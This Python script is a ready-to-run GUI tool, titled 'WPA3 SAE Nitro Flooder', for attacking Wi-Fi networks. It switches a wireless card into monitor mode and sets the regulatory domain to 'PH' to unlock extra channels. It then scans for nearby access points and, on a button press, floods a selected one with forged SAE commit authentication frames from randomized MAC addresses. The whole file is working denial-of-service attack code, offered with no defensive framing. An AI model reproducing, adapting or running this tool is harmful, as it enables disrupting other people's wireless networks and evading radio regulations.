import os, sys, time, threading, random, subprocess
from scapy.all import *
import tkinter as tk
from tkinter import ttk

class SAENitroFlooder:
    def __init__(self, iface):
        self.iface = iface
        self.discovered = {}
        self.running = True
        self.flooding = False
        
        # 1. Unlock hardware and kill interference
        self.prep_environment()
        self.allowed_channels = self.get_channels()
        self.build_gui()

    def prep_environment(self):
        print("[*] Locking hardware into Monitor Mode...")
        os.system("sudo iw reg set PH") # Use PH or BO to unlock 5GHz
        os.system("sudo airmon-ng check kill > /dev/null 2>&1")
        os.system(f"sudo ip link set {self.iface} down")
        os.system(f"sudo iw dev {self.iface} set type monitor")
        os.system(f"sudo ip link set {self.iface} up")

    def get_channels(self):
        try:
            output = subprocess.check_output(f"iwlist {self.iface} freq", shell=True).decode()
            return [int(l.split("Channel ")[1].split(":")[0]) for l in output.split("\n") if "Channel " in l]
        except: return [1, 6, 11, 36, 44, 149, 157]

    def nitro_flood(self, bssid, ch):
        """High-Speed Injection Logic using Persistent L2 Sockets"""
        os.system(f"sudo iw dev {self.iface} set channel {ch}")
        
        # PRE-CRAFT: Build the shell once to save CPU
        # algo=3 (SAE), seqnum=1 (Commit)
        base_pkt = (RadioTap() / 
                    Dot11(addr1=bssid, addr3=bssid) / 
                    Dot11Auth(algo=3, seqnum=1, status=0) / 
                    Dot11Elt(ID=19, info=b"\x13\x00") / 
                    Raw(load=b"\x00"*16))

        # OPEN SOCKET: Direct hardware access
        conf.verb = 0
        s = conf.L2socket(iface=self.iface)
        
        print(f"[*] NITRO FLOOD STARTING ON BSSID: {bssid}")
        while self.flooding:
            # Randomize only the sender MAC
            base_pkt.addr2 = RandMAC()
            try:
                # SEND: No socket overhead here
                s.send(base_pkt) 
            except: break
        s.close()

    # --- Scanner and GUI logic ---
    def hopper(self):
        i = 0
        while self.running:
            if not self.flooding:
                self.current_ch = self.allowed_channels[i]
                os.system(f"sudo iw dev {self.iface} set channel {self.current_ch}")
                i = (i + 1) % len(self.allowed_channels)
                time.sleep(1.5)
            else: time.sleep(1)

    def scanner(self):
        def cb(pkt):
            if pkt.haslayer(Dot11Beacon):
                b = pkt.addr3
                if b not in self.discovered:
                    s = pkt.info.decode(errors='ignore') or "Hidden"
                    self.discovered[b] = {"SSID": s, "CH": self.current_ch}
                    self.root.after(0, self.update_ui)
        sniff(iface=self.iface, prn=cb, store=0)

    def update_ui(self):
        for i in self.tree.get_children(): self.tree.delete(i)
        for b, info in self.discovered.items():
            self.tree.insert("", "end", values=(info["SSID"], b, info["CH"]))

    def toggle_flood(self):
        if not self.flooding:
            sel = self.tree.selection()
            if not sel: return
            self.flooding = True
            self.btn.config(text="STOP NITRO FLOOD", bg="#ff4444")
            t = self.tree.item(sel[0])["values"]
            threading.Thread(target=self.nitro_flood, args=(t[1], t[2]), daemon=True).start()
        else:
            self.flooding = False
            self.btn.config(text="START NITRO FLOOD", bg="#00aa00")

    def build_gui(self):
        self.root = tk.Tk()
        self.root.title("WPA3 SAE Nitro Flooder v9.8")
        self.root.geometry("800x500")
        self.root.configure(bg="#111")
        self.tree = ttk.Treeview(self.root, columns=("SSID", "BSSID", "CH"), show="headings")
        for c in ("SSID", "BSSID", "CH"): self.tree.heading(c, text=c)
        self.tree.pack(fill="both", expand=True, padx=10, pady=10)
        self.btn = tk.Button(self.root, text="START NITRO FLOOD", command=self.toggle_flood, bg="#00aa00", fg="white")
        self.btn.pack(pady=5)
        tk.Button(self.root, text="REPAIR WIFI & EXIT", command=self.repair_and_exit, bg="#333", fg="white").pack(pady=5)
        threading.Thread(target=self.hopper, daemon=True).start()
        threading.Thread(target=self.scanner, daemon=True).start()

    def repair_and_exit(self):
        self.running = False; self.flooding = False
        print("[*] Restoring Managed Mode and NetworkManager...")
        os.system(f"sudo ip link set {self.iface} down")
        os.system(f"sudo iw dev {self.iface} set type managed")
        os.system(f"sudo ip link set {self.iface} up")
        os.system("sudo systemctl restart NetworkManager")
        self.root.destroy()

if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: sudo python3 nitro.py [iface]")
    else: SAENitroFlooder(sys.argv[1]).root.mainloop()
